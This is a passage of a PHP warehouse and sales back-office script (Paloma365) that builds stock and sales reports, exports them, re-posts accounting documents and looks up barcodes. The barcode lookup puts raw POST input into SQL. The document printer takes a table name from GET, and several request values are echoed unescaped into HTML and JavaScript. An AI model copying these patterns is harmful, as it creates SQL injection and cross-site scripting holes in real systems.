  SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice
 FROM r_remainder AS r 
 ".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND quantity<0 AND documentid=4
 GROUP BY warehouseid, itemid, specificationid 
) AS outcome ON outcome.itemid=r.itemid AND outcome.specificationid=r.specificationid AND outcome.warehouseid=r.warehouseid

LEFT JOIN (
 SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity,
  SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice
 FROM r_remainder AS r 
 ".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND quantity>0 
 GROUP BY warehouseid, itemid, specificationid 
) AS income ON income.itemid=r.itemid AND income.specificationid=r.specificationid AND income.warehouseid=r.warehouseid

LEFT JOIN (
 SELECT warehouseid, itemid, specificationid, SUM(quantity) AS quantity,
  SUM(costsum) AS rsum, SUM(costsum) / SUM(quantity) AS costprice
 FROM r_remainder AS r 
 ".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )." AND quantity>0 
 GROUP BY warehouseid, itemid, specificationid 
) AS sales ON sales.itemid=r.itemid AND sales.specificationid=r.specificationid AND sales.warehouseid=r.warehouseid

LEFT JOIN s_items AS i ON i.id=r.itemid
LEFT JOIN s_specifications AS s ON s.id=r.specificationid
LEFT JOIN s_warehouse AS w ON w.id=r.warehouseid
".( !empty( $where2 ) ? ' WHERE '.join( ' AND ', $where2) : '' )."
GROUP BY r.warehouseid, r.itemid, r.specificationid 
ORDER BY warehouse, item, specification";

        $query = mysql_query($query_string1);


            
            $i = 1;
            $sum['rsum'] = 0;
            $sum['plussum'] = 0;
            $sum['minussum'] = 0;
            $sum['newrsum'] = 0;
            $cursum['rsum'] = 0;
            $cursum['plussum'] = 0;
            $cursum['minussum'] = 0;
            $cursum['newrsum'] = 0;
            $curwarehouse = '';
            while ( $row = mysql_fetch_assoc( $query ) ){
                if ( $curwarehouse != $row['warehouse']){
                    if ( !$fromFront && $i > 1 ){
                        $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rcostsum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['rsalesum'], 2 ).'</b></td>
</tr>';
                        
                        $sum['rsum'] += $cursum['rsum'];
                        $sum['plussum'] += $cursum['rcostsum'];
                        $sum['minussum'] += $cursum['rsalesum'];
                        $sum['newrsum'] += $cursum['newrsum'];
                        $cursum['rsum'] = 0;
                        $cursum['plussum'] = 0;
                        $cursum['minussum'] = 0;
                        $cursum['newrsum'] = 0;
                    }
                    
                    $curwarehouse = $row['warehouse'];
                    $output[] = '<tr style="background-color: #C5C5C5"><td colspan="12">Склад: <b>'.$row['warehouse'].'</b></td></tr>';
                }
                $cursum['rsum'] += $row['rsum'];
                $cursum['plussum'] += $row['plussum'];
                $cursum['minussum'] += $row['minussum'];
                $cursum['newrsum'] += $row['newrsum'];
$ss=($row['plussum'] - $row['costprice'] - $row['minussum']);
$profit= ($row['plussum'] )/($ss!=0?$ss:1)*100;
                
                $output[] = '<tr id="'.$row['itemid'].'_'.$row['warehouseid'].'_'.$row['specificationid'].'" class="itemremains">
<td>'.$i.'</td>
<td>'.$row['item'].'</td>
<td>'.$row['specification'].'</td>
<td>'.$row['measure'].'</td>


<td style="'.$right.( $row['quantityminus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityminus'], 3 ).'</td>
<td style="'.$right.( $row['minussum'] < 0 ? $deficitColor : '' ).'">'.round( $row['minussum'], 2 ).'</td>

<td style="'.$right.( $row['quantityplus'] < 0 ? $deficitColor : '' ).'">'.round( $row['quantityplus'], 3 ).'</td>
<td style="'.$right.( $row['costprice'] < 0 ? $deficitColor : '' ).'">'.round( $row['costprice'], 2 ).'</td>
<td style="'.$right.( ($row['plussum']-$row['costprice']) < 0 ? $deficitColor : '' ).'">'.round( ($row['plussum']-$row['costprice']), 2 ).'</td>


<td style="'.$right.( ($row['plussum']-$row['costprice']-$row['minussum']) < 0 ? $deficitColor : '' ).'">'.round( ($row['plussum']-$row['costprice']-$row['minussum']), 2 ).'</td>

<td style="'.$right.( ($row['plussum']-$row['costprice']-$row['minussum']) < 0 ? $deficitColor : '' ).'">'.round( 
    ($profit), 2 ).'</td>


</tr>';
                $i++;
            }
            
            if ( !$fromFront ){
                $output[] = '<tr style="background-color: #C5C5C5">
<td colspan="5">Итого по складу <b>'.$curwarehouse.'</b></td>
<td style="'.$right.( $cursum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $cursum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $cursum['minussum'], 2 ).'</b></td>
</tr>';
                        
            $sum['rsum'] += $cursum['rsum'];
            $sum['plussum'] += $cursum['plussum'];
            $sum['minussum'] += $cursum['minussum'];
            $sum['newrsum'] += $cursum['newrsum'];
            
            $output[] = '<tr class="tableheader">
<td colspan="5"><b>Итого</b></td>
<td style="'.$right.( $sum['plussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['plussum'], 2 ).'</b></td>
<td></td>
<td style="'.$right.( $sum['minussum'] < 0 ? $deficitColor : '' ).'"><b>'.round( $sum['minussum'], 2 ).'</b></td>
</tr>';
            }
             
            $output[] = '</table></div><br />';
            $output[] = '</div>';
            
            if ( isset( $_GET['print'] ) ){
                switch( $_GET['ftype'] ){
                    case 'xls':  
                        header( "Content-Type: application/download\n" ); 
                        header( "Content-Disposition: attachment; filename=".time().'.xls' );
                        $res = join( "", $output );
                        //переводим в вин-1251
                        echo iconv( "UTF-8", "windows-1251", $res );
                    break;
                    case 'html': 
                        echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Paloma365 Анализ продаж</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>*{font:'.getConfigVal('otchet_font_size').'px Tahoma;margin:0;padding:0} h1{font:bold '.getConfigVal('otchet_h1_size').'px Tahoma} b{font-weight:bold} table{margin: 0; padding: 0; border: 1px solid #000;border-collapse:collapse; width: '.getConfigVal('otchet_width').'px;}
table td{border: 1px dotted #CCCCCC; margin: 0; padding: 3px; border: 1px solid #000;}
.tableheader{background: #F3F3F3;}</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                        echo join( "", $output );
                        echo '</body></html>';
                    break;
                    case 'pdf': 
                        require_once( 'pdf/mpdf.php' );
                        $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                        $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                        $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                        $mpdf->WriteHTML( $stylesheet, 1 );
                        $mpdf->list_indent_first_level = 0; 
                        $mpdf->WriteHTML( join( "\n", $output ), 2 ); /*формируем pdf*/
                        $mpdf->Output( 'mpdf.pdf', 'I' );
                     break;
                }
             } else echo join( "\n", $output );
                 
             echo '<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=pdf&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/icon_pdf.png"></a> 
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=xls&'.join( '&', $query_string ).'" target="_blank"><img src="/company/i/xls.gif"></a>
<a href="/company/warehouse/warehouse.php?do=remains&print=1&ftype=html&'.join( '&', $query_string ).'" target="_blank" class="printota"><img src="/company/i/printer.gif"></a>';
echo '<script>
$( ".itemremains" ).die( "click" );
$( ".itemremains" ).live( "click", function (){
    s = $( this ).attr( "id" );
    pos1 = s.indexOf( "_" );
    itemid = s.substr( 0, pos1 );
    s = s.substr( pos1 + 1 );
    pos1 = s.indexOf( "_" );
    warehouseid = s.substr( 0, pos1 );
    specificationid = s.substr( pos1 + 1 );
    title = "Движения товаров";
    otchet = "gethtml_remainsdetailed";
    console.log(warehouseid + " - " + itemid + " - " + specificationid);
    $.ajax({ 
        type: "POST",
        url: "/company/warehouse/warehouse.php?do=remainsdetailed&item="+itemid+"&warehouse="+warehouseid+"&specification="+specificationid+"&dt1='.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'&dt2='.date( 'Y-m-d H:i:s',strtotime( $_POST['chb_zaperiod2'] ) ).'"
    }).success( function ( form ){
        removeTabIfExist( \'#tab_\' + otchet );
        cont = \'<div class="bggrey"><h4>\' + title + \'</h4></div><div class="righttd-content">\' + form + \'</div>\';     
        addTab( title, otchet, cont ); 
        $( \'.righttd-content\' ).height( $( \'.righttd\' ).height() - 144 );
    });
});
</script>';
        break;
////АНАЛИЗ ПРОДАЖ  

        // список счетов для проведения
        case 'getOrdersList':
            $where = array();
            $doit = true;
            
            if ($datez=getConfigVal('stopconductdate')){
                if ($datez!='')
                    $where[] =" creationdt>'".date('Y-m-d H:i:s',strtotime($datez))."'";
            }
            
            
            if ( $_POST['idautomated_point'] > 0 ){
                $where[] = 'idautomated_point="'.addslashes( $_POST['idautomated_point'] ).'"';
            } else if ( !isset( $_SESSION['admin'] ) ){
                $res = mysql_query( 'SELECT rollid, GROUP_CONCAT(DISTINCT tid) AS tid FROM `t_employee_interface` AS i LEFT JOIN `z_user_right` AS r ON r.uid=i.employeeid AND `view`=1 WHERE i.employeeid='.$_SESSION['userid'] );
                $tid = mysql_fetch_array( $res );
                if ( $tid['rollid'] == 2 ){
                    if ( $tid['tid'] == '' ){
                        $doit = false;
                    } else 
                        $where[] = 'idautomated_point IN ('.$tid['tid'].')';
                }
            }

            if ( $doit ){
                switch( $_POST['chb'] ){
                    case 'zasmenu':
                        if ( $_POST['chb_zasmenu'] > 0 ){
                            $where[] = 'changeid="'.addslashes( $_POST['chb_zasmenu'] ).'"';
                            $query = mysql_query( "SELECT a.name, e.fio, c.dtopen, c.dtclosed FROM `d_changes` AS c LEFT JOIN s_automated_point AS a ON a.id=c.idautomated_point
    LEFT JOIN s_employee AS e ON e.id=c.employeeid WHERE c.id='".addslashes( $_POST['chb_zasmenu'] )."' LIMIT 1" );
                            $row = mysql_fetch_assoc( $query );
                            $title = 'за смену <b>'.$row['name'].'_'.$row['fio'].'_'.$row['dtopen'].'-'.$row['dtclosed'].'</b>';
                        }
                    break;
                    case 'zaperiod':
                        if ( ( $_POST['chb_zaperiod1'] != '' )&&( $_POST['chb_zaperiod2'] != '' ) ){
                            $where[] = '((creationdt>="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod1'] ) ).'") AND (creationdt<="'.date('Y-m-d H:i:s', strtotime( $_POST['chb_zaperiod2'] ) ).'"))';
                            $title = 'за период с <b>'.$_POST['chb_zaperiod1'].'</b> по <b>'.$_POST['chb_zaperiod2'].'</b>';
                        }
                    break;
                    case 'smenperiod':
                        if ( ( $_POST['chb_smenperiod1'] != '' )&&( $_POST['chb_smenperiod2'] != '' ) ){
                           $where[] = '((d_changes.dtopen>="'.date( 'Y-m-d H:i:s', strtotime( $_POST['chb_smenperiod1'] ) ).'") AND (d_changes.dtopen<="'.date('Y-m-d H:i:s', strtotime( $_POST['chb_smenperiod2'] ) ).'"))';
                           $title = 'за смены за период с <b>'.$_POST['chb_smenperiod1'].'</b> по <b>'.$_POST['chb_smenperiod2'].'</b>';
                        }
                    break;
                }
            
                if ( isset( $_POST['reconduct'] ) ){
                    if ( mysql_query( 'DELETE FROM r_remainder WHERE documenttype=0 AND documentid IN (SELECT id FROM d_order '.( !empty( $where ) ? 'WHERE conducted=1 AND '.join( ' AND ', $where ) : '' ).')' ) )
                        mysql_query( 'UPDATE d_order SET conducted=0 '.( !empty( $where ) ? 'WHERE conducted=1 AND '.join( ' AND ', $where ) : '' ) );
                    else die( 'Ошибка при отмене проведения счетов!<br />'.mysql_error() );
                }
                $where[] = 'conducted=0 AND closed=1';
                
            

// НУЖНО ГДЕ-ТО ХРАНИТЬ ПАРАМЕТР!!!
// UPD: теперь это зависит от торговой точки хХ
//                $withIngredients = false;
                
                //$answer = '';
                $docList = array();
                $dtstart = '';
                $dtend = '';
                
                $query = 'SELECT id, creationdt FROM d_order '.( !empty( $where ) ? 'WHERE '.join( ' AND ', $where ) : '' );
                //echo $query;
                //$query = 'SELECT id FROM d_order WHERE (creationdt>="2013-11-17 00:00:00") AND (creationdt<="2013-11-23 23:59:59") AND conducted=0';
                
                if ( $result = mysql_query( $query ) ){// AND id=18452
                    while ( $row = mysql_fetch_array( $result ) ){
                        if ( $dtstart == '' ) $dtstart = $row['creationdt'];
                        $docList[] = array( 'doctype' => '0', 'id' => $row['id'] );
                        $dtend = $row['creationdt'];
//                        if ( conduct( 'd_order', $row['id'], $withIngredients ) )
//                            $answer .= 'Счет №'.$row['id'].' проведен<br />';
//                        else
//                            $answer .= 'Счет №'.$row['id'].' не был проведен<br />';
                    }
                    echo json_encode( array( 'm' => $docList, 'count' => count( $docList ), 'msg' => '', 'dtstart' => $dtstart, 'dtend' => $dtend ) );
                    //$answer = '<div style="max-height: 380px; overflow: auto;">'.$answer.'</div><div style="margin-top: 10px;">Проведение счетов '.$title.' завершено.</div>';
                } else
                    echo json_encode( array( 'm' => '', 'count' => 0, 'msg' => 'Отсутствуют счета '.$title.'.' ) );
//                    $answer .= 'Отсутствуют счета '.$title.'.';
                //echo $answer;
            } else
                echo json_encode( array( 'm' => '', 'count' => 0, 'msg' => PERMISSION_DENIED ) );
        break;
        // проведение вышеполученного счета
        case 'conductOrders':
            $docid = isset( $_POST['id'] ) ? addslashes( $_POST['id'] ) : 0;
            
            if ( $docid == 0 ) $answer = 'Неверные параметры операции!';
            else {            
                if ( conduct( 'd_order', $docid ) )
                    $answer = 'Счет №'.str_pad( $docid, 10, '0', STR_PAD_LEFT ).' проведен<br />';
                else
                    $answer = '<span style="color: red;">Счет №'.str_pad( $docid, 10, '0', STR_PAD_LEFT ).' не был проведен</span><br />';
            }
            
            echo $answer;
        break;
        
//ПЕРЕПРОВЕДЕНИЕ ДОКУМЕНТОВ, НАЧИНАЯ С <ДАТЫ> , возвращает список для следующей функции       
        case 'getReconductList':
            //$answer = '';
            if ( $_POST['chb'] == 'actual' )
                $dt = getActualDt();
            else {
                $dt = isset( $_POST['chb_zaperiod1'] ) ? $_POST['chb_zaperiod1'] : '';//$_GET['dt'];
            }

            if ( $dt != '' ){
                $dt = date( 'Y-m-d H:i:s', strtotime( $dt ) );
                if ( $result = mysql_query( "SELECT id, docname, dt FROM (
(SELECT dt, id, 'd_receipt' AS docname, 1 AS pos FROM d_receipt WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_posting' AS docname, 2 AS pos FROM d_posting WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_movement' AS docname, 3 AS pos FROM d_movement WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_selling' AS docname, 4 AS pos FROM d_selling WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_cancellation' AS docname, 5 AS pos FROM d_cancellation WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_production' AS docname, 6 AS pos FROM d_production WHERE dt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT creationdt AS dt, id, 'd_order' AS docname, 7 AS pos FROM d_order WHERE creationdt>='".$dt."' AND conducted=1)
UNION ALL
(SELECT dt, id, 'd_inventory' AS docname, 101 AS pos FROM d_inventory WHERE dt>='".$dt."' AND conducted=1)
) AS t
ORDER BY dt, pos" ) ){

//                    $t = false;
//                    mysql_query( 'START TRANSACTION' );
//                    $t = mysql_query( 'DELETE FROM r_remainder WHERE dt>="'.$dt.'"' );
//                    if ( $t ) mysql_query( 'COMMIT' );
//                    else mysql_query ( 'ROLLBACK' );
                    
                    $t = true;
                    $docList = array();
                    $dtend = '';
                    
                    $t = mysql_num_rows( $result ) > 0;
                    
                    if ( $t ){
                        while ( $row = mysql_fetch_array( $result ) ){
                            $docList[] = array( 'doctype' => $row['docname'], 'id' => $row['id'] );
                            $dtend = $row['dt'];
//                            $withIngredients = $row['docname'] == 'd_production';
//
//                            if ( conduct( $row['docname'], $row['id'], $withIngredients ) )
//                                $answer .= 'Документ '.$row['doctitle'].' №'.( $row['idout'] == '' ? $row['id'] : $row['idout'] ).' проведен<br />';
//                            else
//                                $answer .= 'Документ '.$row['doctitle'].' №'.( $row['idout'] == '' ? $row['id'] : $row['idout'] ).' не был проведен<br />';
                        }
                        
                        echo json_encode( array( 'm' => $docList, 'count' => count( $docList ), 'msg' => '', 'dtstart' => $dt, 'dtend' => $dtend ) );
                        //$answer = '<div style="max-height: 380px; overflow: auto;">'.$answer.'</div><div style="margin-top: 10px;">Проведение документов завершено.</div>';
                    } else                        
                        echo json_encode( array( 'm' => '', 'count' => 0, 'msg' => 'Не удалось отменить проведение документов!' ) );
                        //$answer = 'Не удалось отменить проведение документов!';
                } else
                    echo json_encode( array( 'm' => '', 'count' => 0, 'msg' => 'Документы не найдены!' ) );
                    //$answer = 'Документы не найдены!';
            } else
                echo json_encode( array( 'm' => '', 'count' => 0, 'msg' => 'Недостаточно параметров для проведения операции!' ) );
                //$answer == 'Недостаточно параметров для проведения операции!';
            
            //echo $answer;
        break;
        // перепроведение документа
        case 'reconduct':
            $docname = isset( $_POST['doctype'] ) ? addslashes( $_POST['doctype'] ) : '';
            $docid = isset( $_POST['id'] ) ? addslashes( $_POST['id'] ) : 0;
            
            if ( $docname == '' || $docid == 0 ) $answer = 'Неверные параметры операции!';
            else {
                $doctitle = $docname;
                switch ( $docname ){
                    case 'd_receipt':       $doctitle = 'Поступление товаров';      break;
                    case 'd_posting':       $doctitle = 'Оприходование товаров';    break;
                    case 'd_movement':      $doctitle = 'Перемещение товаров';      break;
                    case 'd_selling':       $doctitle = 'Реализация товаров';       break;
                    case 'd_cancellation':  $doctitle = 'Списание товаров';         break;
                    case 'd_production':    $doctitle = 'Выпуск готовой продукции'; break;
                    case 'd_order':         $doctitle = 'Счет';                     break;
                    case 'd_inventory':     $doctitle = 'Инвентаризация товаров';   break;
                    case 'd_regrading':     $doctitle = 'Пересортица товаров';      break;
                }
            
                if ( conduct( $docname, $docid ) )
                    $answer = 'Документ <b>"'.$doctitle.' №'.str_pad( $docid, 10, '0', STR_PAD_LEFT ).'"</b> проведен<br />';
                else
                    $answer = '<span style="color: red;">Документ <b>"'.$doctitle.' №'.str_pad( $docid, 10, '0', STR_PAD_LEFT ).'"</b> не был проведен</span><br />';
            }
            
            echo $answer;
        break;
        //Проверка точки актуальности
        case 'checkActualDt':
            if ( isset( $_POST['dtstart'] ) && isset( $_POST['dtend'] ) ){
                $dt1 = strtotime( $_POST['dtstart'] );
                $dt2 = $_POST['dtend'];
                $actualDt = strtotime( getActualDt() );

                echo $dt1.' - '.$dt2.' - '.$actualDt;
                
                if ( $dt1 <= $actualDt ) setActualDt ( $dt2 );
            }
        break;
        
        case 'printDocument':
            $table = isset( $_GET['table'] ) ? $_GET['table'] : '';
            $id = isset( $_GET['id'] ) ? intval( $_GET['id'] ) : 0;
            
            if ( $table == '' || $id == 0 )
                echo '<script>window.close();</script>';
            else {
                if ( $table == 's_calculations' ){
                    $result = mysql_query( 'SELECT itemid FROM s_calculations WHERE id='.$id );
                    $row = mysql_fetch_row( $result );

                    echo '<script>window.location = "/company/warehouse/warehouse.php?do=tipaotchet&print=1&chb=avgprice&itemid='.$row[0].'&showIngredients=1";</script>';
                } else {
                    $res = array();
                    $wherestr = " WHERE id=".$id;
                    $query = mysql_query( "SELECT * FROM `".addslashes( $table )."` ".addslashes( $wherestr )." LIMIT 1" );

                    $res[] = '<table class="maintable" style="margin: 10px 0 0 10px; padding: 0; border-collapse: collapse; width: '.getConfigVal('otchet_width').'px;">';

                    $maincol1 = ' style="width: 90px; margin: 0; padding: 3px;"';
                    //$maincol1 = ' style="text-align: right; width: 90px; margin: 0; padding: 3px; padding-right: 10px;"';
                    $maincol2 = ' style="font-weight: 600; margin: 0; padding: 3px;"';
                    
                    while ( $row = mysql_fetch_array( $query ) ){
                        foreach( $fields[$table] as $k => $v ){
                            if ( $v['in_edit'] ){
                                switch( $v['type'] ){
                                    case 'label':
                                        $a = '<tr><td'.$maincol1.'>'.$v['title'].':</td>
    <td'.$maincol2.'>'.get_select_val( $v['db_select'], $row[$k] ).'</td></tr>';
                                    break;
                                    case 'sum':
                                        $a = '<tr><td'.$maincol1.'>'.$v['title'].':</td>
    <td'.$maincol2.'>'.get_db_select_sum( $v['db_select'], $v['idfield'], $row["id"], $v['sumfield'], 2 ).'</td></tr>';
                                    break;
                                    case 'rowsum':
                                        $a .= '<tr><td'.$maincol1.'>'.$v['title'].':</td>';
                                        if ( $k == 'totalplanned' )
                                            $a .= '<td'.$maincol2.'>'.round( $row["plannedquantity"] * $row["price"] * $row["multip"], 2 ).'</td></tr>';
                                        else
                                            $a .= '<td'.$maincol2.'>'.round( $row["quantity"] * $row["price"] * $row["multip"], 2 ).'</td></tr>';
                                    break;
                                    case 'diff':
                                        $a = '<tr><td'.$maincol1.'>'.$v['title'].':</td>
    <td'.$maincol2.'>'.round( $row["quantity"] - $row["plannedquantity"], 2 ).'</td></tr>';
                                    break;
                                    case 'date':
                                    case 'datetime':
                                    case 'input':
                                        $a = '<tr><td'.$maincol1.'>'.$v['title'].':</td><td'.$maincol2.'>'.$row[$k].'</td></tr>';
                                    break;
                                    case 'db_select':
                                    case 'db_groupselect':
                                        $a = '<tr><td'.$maincol1.'>'.$v['title'].':</td>';
                                        if ( $k == 'documentid' ){
                                            $a .= '<td'.$maincol2.'>'.$row[$k].'</td></tr>';
                                        } else {
                                            $a .= '<td'.$maincol2.'>'.get_select_val( $v['db_select'], $row[$k] ).'</td></tr>';
                                        }
                                    break;
                                    case 'db_grid':
                                        $a = '<td colspan=2 style="padding-top: 10px; ">'.$v['title'].':</td></tr><tr><td colspan=2>';
                                        $a .= getDocTable( $v['db_grid'], $row['id'], $v['idfield'] );
                                        $a .= '</td></tr>';
                                    break;
                                }

                                $res[] = $a;
                            }
                        }
                    }

                    $res[] = '</table>';

                    if ( isset( $_GET['print'] ) ){
                        if ( empty( $_GET['ftype'] ) ){
                                echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>
    *{ font: '.getConfigVal('otchet_font_size').'px Tahoma; margin:0; padding:0 } 
    h1{ font:bold '.getConfigVal('otchet_h1_size').'px Tahoma } 
    b{ font-weight: bold } 
    table{ margin: 0; padding: 0; border-collapse: collapse; width: '.getConfigVal('otchet_width').'px; }
    table td{ margin: 0; padding: 3px; }
    .tableheader{ background: #F3F3F3; }
    .maintable { margin: 10px 0 0 10px; }
    .maincol1 { width: 120px; }
    .maincol2 { font-weight: 600; }
    .doctable{ border: 1px solid #555; margin-bottom: 10px; }
    .doctable td{ border: 1px solid #CCC; }
    .doctable td:nth-child(2){ min-width: 120px; }
    .numeric{ text-align: right; }
</style>
</head>
<body>';
                                echo join( "", $res );
                                echo '<div style="margin: 10px 0 0 10px">
<a href="/company/warehouse/warehouse.php?do=printDocument&table='.$table.'&id='.$id.'&print=1&ftype=pdf" target="_blank" title="Экспорт в PDF"><img src="/company/i/icon_pdf.png"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=printDocument&table='.$table.'&id='.$id.'&print=1&ftype=xls" target="_blank" title="Экспорт в MS Excel"><img src="/company/i/xls.gif"></a>&nbsp;&nbsp;
<a href="/company/warehouse/warehouse.php?do=printDocument&table='.$table.'&id='.$id.'&print=1&ftype=html" target="_blank" class="printota" title="Печать на принтер"><img src="/company/i/printer.gif"></a>
</div>';
                                echo '</body></html>';                    
                        } else switch( $_GET['ftype'] ){
                            case 'xls':  
                                header( "Content-Type: application/download\n" ); 
                                header( "Content-Disposition: attachment; filename=".time().'.xls' );
                                $res = join( "", $res );
                                //переводим в вин-1251
                                echo iconv( "UTF-8", "windows-1251", $res );
                            break;
                            case 'html': 
                                echo '<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Справочники</title>
<script type="text/javascript" src="/company/js/jquery-1.8.0.min.js"></script>
<style>
    *{ font: '.getConfigVal('otchet_font_size').'px Tahoma; margin:0; padding:0 } 
    h1{ font:bold '.getConfigVal('otchet_h1_size').'px Tahoma } 
    b{ font-weight: bold } 
    table{ margin: 0; padding: 0; border-collapse: collapse; width: '.getConfigVal('otchet_width').'px; }
    table td{ margin: 0; padding: 3px; }
    .tableheader{ background: #F3F3F3; }
    .maintable { margin: 10px 0 0 10px; }
    .maincol1 { width: 120px; }
    .maincol2 { font-weight: 600; }
    .doctable{ border: 1px solid #555; margin-bottom: 10px; }
    .doctable td{ border: 1px solid #CCC; }
    .doctable td:nth-child(2){ min-width: 120px; }
    .numeric{ text-align: right; }
</style>
<script> $( document ).ready( function (){ window.print(); setTimeout( function (){ window.close(); }, 200 ); }); </script>
</head>
<body>';
                                echo join( "", $res );
                                echo '</body></html>';
                            break;
                            case 'pdf': 
                                require_once( 'pdf/mpdf.php' );
                                $mpdf = new mPDF( 'utf-8', 'A4', '8', '', 2, 2, 1, 1, 2, 2 ); /*задаем формат, отступы и.т.д.*/
                                $mpdf->charset_in = 'utf8'; /*не забываем про русский*/
                                $stylesheet = file_get_contents( 'pdf/mpdf.css' ); /*подключаем css*/
                                $mpdf->WriteHTML( $stylesheet, 1 );
                                $mpdf->list_indent_first_level = 0; 
                                $mpdf->WriteHTML( join( "\n", $res ), 2 ); /*формируем pdf*/
                                $mpdf->Output( 'mpdf.pdf', 'I' );
                             break;
                        }
                     } else echo join( "\n", $res );
                }
            }
        break;
        // сикер хуикер
        case 'barcodeSeeker':
            $sender = isset( $_POST['sender'] ) ? $_POST['sender'] : '';
            
            echo '<div class="modal fade"  id="dialog_barcodeSeeker"  tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" style="width:900px" >
<div class="modal-content">
<div class="modal-header">
    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
    <h4 class="modal-title">Введите штрих-код</h4></div>
<div class="modal-body"><div class="formp">
<form class="form-horizontal" role="form" id="form_barcodeSeeker" method="post" action="/company/warehouse/warehouse.php?do=seekBarcode" novalidate>
    <div class="form-group">
        <label class="col-lg-4 control-label">Штрих-код: </label>
        <div class="col-lg-8"><input name="barcode" class="form-control" value=""></div>
    </div>
</form>
</div></div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Отмена</button> 
<button id="seekBtn" type="button" class="btn btn-primary" onclick="seekBarcode( \''.$sender.'\' );">Найти</button> 
</div></div></div></div>';
        break;
        // см выше
        case 'seekBarcode':
            $barcode = isset( $_POST['barcode'] ) ? $_POST['barcode'] : '';
            $answer = array();
            if ( $result = mysql_query( "SELECT i.id AS itemid, i.name AS item, msr.id AS measureid, msr.name AS measure, i.specificationid, i.specification, i.price
FROM (
SELECT i.id, i.name, IF(i.mainShtrih='".$barcode."', i.measurement, s.measureid) AS measureid, h.id AS specificationid, h.name AS specification, i.price
FROM s_items AS i
LEFT JOIN s_shtrih AS s ON s.itemid=i.id
LEFT JOIN s_specifications AS h ON h.id=s.specificationid
WHERE i.mainShtrih='".$barcode."' OR s.shtrih='".$barcode."'
LIMIT 1
) AS i
LEFT JOIN s_units_of_measurement AS msr ON msr.id = i.measureid" ) ){
                $answer = mysql_fetch_array( $result );
            }
            
            if ( empty( $answer ) ){
                $answer['itemid'] = 0;
                $answer['item'] = 'Товар с штрих-кодом '.$barcode.' не найден.';
            }
            
            echo json_encode( $answer );
        break;
//Сводная таблица калькуляций
        case 'tipaotchet':
             $output = array();
             $order = 'id';
             $group = '';
             $inxls = '';
             
             //Принт версия
             if ( isset( $_GET['print'] ) ){
                 $inxls = 'border="1"';
                 if ( isset( $_GET['chb'] ) ){
                     $_POST['chb'] = $_GET['chb'];
                     $query_string[] = 'chb='.$_POST['chb'];
                 }
                 if ( isset( $_GET['itemid'] ) ){
                     $_POST['itemid'] = $_GET['itemid'];
                     $query_string[] = 'itemid='.$_POST['itemid'];
                 }
                 if ( isset( $_GET['showIngredients'] ) ){
                     $_POST['showIngredients'] = $_GET['showIngredients'];
                     $query_string[] = 'showIngredients='.$_POST['showIngredients'];
                 }
             } else {
                 //Формирование ссылки на кнопку "В файл"
                $query_string = array();
                if ( isset( $_POST['chb'] ) ) $query_string[] = 'chb='.$_POST['chb'];
                if ( isset( $_GET['itemid'] ) && empty( $_POST['itemid'] ) ) $_POST['itemid'] = $_GET['itemid'];
                if ( isset( $_POST['itemid'] ) ) $query_string[] = 'itemid='.$_POST['itemid'];
                if ( isset( $_POST['showIngredients'] ) ) $query_string[] = 'showIngredients='.$_POST['showIngredients'];
            }

            $output[]='<span style="font:10px Tahoma;">Время формирования отчета: '.date('d.m.Y H:i:s').'</span>';
            $output[]='<div class="div_otchet">';
            
            $i = 1;
            $title = '';

            //ФИЛЬТРЫ
            $where = '';
            if ( $_POST['itemid'] > 0 ){
                $id = intval( $_POST['itemid'] );
                $result = mysql_query( 'SELECT isgroup FROM s_items WHERE id="'.$id.'"' );
                $row = mysql_fetch_array( $result );
                if ( $row['isgroup'] == 1 )
                    $where = 'i.parentid IN ('.substr( get_parents( $id ), 0, -1 ).')';
                else
                    $where = 'i.id="'.$id.'"';
            } else {
